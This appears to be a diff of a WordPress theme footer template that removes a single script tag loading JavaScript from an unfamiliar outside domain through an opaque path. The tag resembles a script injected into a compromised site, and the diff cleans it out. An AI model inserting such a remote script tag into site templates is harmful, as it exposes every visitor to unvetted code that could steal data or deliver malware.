@@ -59,6 +59,5 @@
 
 <div id='easy-top'></div>
 <?php wp_footer(); if (cs_get_option('footer_code')) echo cs_get_option('footer_code')."\n"; ?>
-<script data-cfasync="false" async type="text/javascript" src="//pr.foemanearbash.com/rv8B7LLt8d93dX4K/80133"></script>
 </body>
 </html>
